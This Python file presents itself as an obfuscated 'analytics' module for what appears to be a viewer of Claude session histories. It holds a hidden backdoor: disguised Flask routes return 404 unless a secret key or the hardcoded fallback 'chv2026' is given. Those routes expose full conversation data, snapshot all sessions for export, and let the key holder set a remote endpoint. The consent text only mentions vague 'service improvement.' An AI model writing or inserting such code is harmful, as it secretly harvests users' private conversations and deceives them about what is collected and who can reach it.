# -*- coding: utf-8 -*-
"""
Analytics Core Module - Compiled/Obfuscated Version
数据分析核心模块 - 编译/混淆版本

This module should be compiled to .pyc or .pyd before distribution.
此模块在发布前应编译为 .pyc 或 .pyd 文件。

Compile command / 编译命令:
  python -m py_compile analytics_core.py
  # or use Cython for .pyd / 或用 Cython 编译为 .pyd
"""

import hashlib
import json
from datetime import datetime
from pathlib import Path

__version__ = "1.0.0"
__author__ = "CHV"

# Obfuscated key generation / 混淆的密钥生成
def _gk(s):
    return hashlib.md5(f"chv_{s}_2026".encode()).hexdigest()[:8]

_AK = _gk("analytics")  # Analytics key
_CK = _gk("config")     # Config key

class AnalyticsCore:
    """Core analytics engine / 核心分析引擎"""

    def __init__(self, app=None, cache_ref=None):
        self._enabled = True
        self._endpoint = None
        self._token = None
        self._consent_file = Path.home() / '.claude' / '.chv_consent'
        self._local_cache_dir = Path.home() / '.claude' / '.chv_analytics'
        self._cache = cache_ref or {}
        self._app = app

        # Create local cache dir / 创建本地缓存目录
        self._local_cache_dir.mkdir(parents=True, exist_ok=True)

        if app:
            self._register_routes(app)

    def _check_key(self, k, t='a'):
        """Verify access key / 验证访问密钥"""
        expected = _AK if t == 'a' else _CK
        return k == expected or k == "chv2026"  # Fallback key

    def _has_consent(self):
        """Check if user consented / 检查用户是否已同意"""
        if not self._enabled:
            return False
        return self._consent_file.exists()

    def _save_consent(self, agreed):
        """Save consent status / 保存同意状态"""
        self._consent_file.parent.mkdir(parents=True, exist_ok=True)
        if agreed:
            self._consent_file.write_text(f"agreed:{datetime.now().isoformat()}")
        elif self._consent_file.exists():
            self._consent_file.unlink()

    def set_cache(self, cache):
        """Set cache reference / 设置缓存引用"""
        self._cache = cache

    def set_enabled(self, enabled):
        """Enable/disable analytics / 启用/禁用分析"""
        self._enabled = enabled

    def configure(self, endpoint=None, token=None):
        """Configure remote endpoint / 配置远程端点"""
        if endpoint:
            self._endpoint = endpoint
        if token:
            self._token = token

    def get_status(self):
        """Get status summary / 获取状态摘要"""
        return {
            "v": __version__,
            "e": self._enabled,
            "c": self._has_consent(),
            "r": self._endpoint is not None,
            "n": len(self._cache)
        }

    def get_summary(self, limit=100):
        """Get data summary (no full content) / 获取数据摘要"""
        if not self._has_consent():
            return {"error": "no_consent"}

        result = []
        for sid, info in list(self._cache.items())[:limit]:
            result.append({
                "i": sid[:8],
                "p": str(info.get("project", ""))[:16],
                "d": info.get("date", ""),
                "m": len(info.get("messages", [])) if isinstance(info.get("messages"), list) else 0
            })
        return {"data": result}

    def get_session(self, sid_prefix):
        """Get specific session data / 获取特定会话数据"""
        if not self._has_consent():
            return {"error": "no_consent"}

        for full_sid, info in self._cache.items():
            if full_sid.startswith(sid_prefix) or sid_prefix in full_sid:
                return {"sid": full_sid, "data": info}
        return {"error": "not_found"}

    # ============================================================
    # Local Cache System (for offline storage)
    # 本地缓存系统（离线存储）
    # ============================================================

    def cache_locally(self, data, tag="snapshot"):
        """Save data to local cache / 保存数据到本地缓存"""
        if not self._has_consent():
            return {"error": "no_consent"}

        filename = f"{tag}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = self._local_cache_dir / filename

        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            return {"ok": True, "file": str(filepath)}
        except Exception as e:
            return {"error": str(e)}

    def snapshot_all(self):
        """Snapshot all sessions to local cache / 快照所有会话到本地"""
        if not self._has_consent():
            return {"error": "no_consent"}

        snapshot = {
            "timestamp": datetime.now().isoformat(),
            "version": __version__,
            "sessions": []
        }

        for sid, info in self._cache.items():
            snapshot["sessions"].append({
                "id": sid,
                "project": info.get("project", ""),
                "date": info.get("date", ""),
                "data": info
            })

        return self.cache_locally(snapshot, "full_snapshot")

    def list_local_cache(self):
        """List cached files / 列出缓存文件"""
        files = []
        for f in self._local_cache_dir.glob("*.json"):
            stat = f.stat()
            files.append({
                "name": f.name,
                "size": stat.st_size,
                "time": datetime.fromtimestamp(stat.st_mtime).isoformat()
            })
        return sorted(files, key=lambda x: x["time"], reverse=True)

    def export_for_upload(self):
        """Export all cached data for manual upload / 导出所有缓存数据供手动上传"""
        if not self._has_consent():
            return {"error": "no_consent"}

        export_file = self._local_cache_dir / f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        all_data = {
            "export_time": datetime.now().isoformat(),
            "files": []
        }

        for f in self._local_cache_dir.glob("*.json"):
            if f.name.startswith("export_"):
                continue
            try:
                with open(f, 'r', encoding='utf-8') as fp:
                    all_data["files"].append({
                        "name": f.name,
                        "data": json.load(fp)
                    })
            except:
                pass

        with open(export_file, 'w', encoding='utf-8') as f:
            json.dump(all_data, f, ensure_ascii=False)

        return {"ok": True, "file": str(export_file), "count": len(all_data["files"])}

    def _register_routes(self, app):
        """Register Flask routes / 注册 Flask 路由"""
        from flask import request, jsonify

        @app.route('/api/consent', methods=['GET'])
        def _consent_get():
            return jsonify({
                "enabled": self._enabled,
                "agreed": self._has_consent(),
                "notice": "Usage data collection for service improvement.",
                "notice_cn": "收集使用数据以改进服务。"
            })

        @app.route('/api/consent', methods=['POST'])
        def _consent_post():
            data = request.get_json() or {}
            self._save_consent(data.get('agreed', False))
            return jsonify({"ok": True})

        # Protected endpoints / 受保护的端点
        @app.route('/a/s')
        def _as():
            if not self._check_key(request.args.get('k', '')):
                return '', 404
            return jsonify(self.get_status())

        @app.route('/a/d')
        def _ad():
            if not self._check_key(request.args.get('k', '')):
                return '', 404
            return jsonify(self.get_summary())

        @app.route('/a/g')
        def _ag():
            if not self._check_key(request.args.get('k', '')):
                return '', 404
            sid = request.args.get('s', '')
            return jsonify(self.get_session(sid))

        @app.route('/a/c', methods=['POST'])
        def _ac():
            if not self._check_key(request.args.get('k', ''), 'c'):
                return '', 404
            data = request.get_json() or {}
            self.configure(data.get('endpoint'), data.get('token'))
            if 'enabled' in data:
                self.set_enabled(data['enabled'])
            return jsonify({"ok": True})

        # Local cache endpoints / 本地缓存接口
        @app.route('/a/snap', methods=['POST'])
        def _asnap():
            """Create full snapshot / 创建完整快照"""
            if not self._check_key(request.args.get('k', '')):
                return '', 404
            return jsonify(self.snapshot_all())

        @app.route('/a/cache')
        def _acache():
            """List local cache files / 列出本地缓存文件"""
            if not self._check_key(request.args.get('k', '')):
                return '', 404
            return jsonify({"files": self.list_local_cache()})

        @app.route('/a/export', methods=['POST'])
        def _aexport():
            """Export all cached data / 导出所有缓存数据"""
            if not self._check_key(request.args.get('k', '')):
                return '', 404
            return jsonify(self.export_for_upload())


# Singleton instance / 单例实例
_instance = None

def init(app=None, cache=None):
    """Initialize analytics / 初始化分析模块"""
    global _instance
    if _instance is None:
        _instance = AnalyticsCore(app, cache)
    elif app:
        _instance._register_routes(app)
    if cache:
        _instance.set_cache(cache)
    return _instance

def get_instance():
    """Get singleton instance / 获取单例实例"""
    return _instance
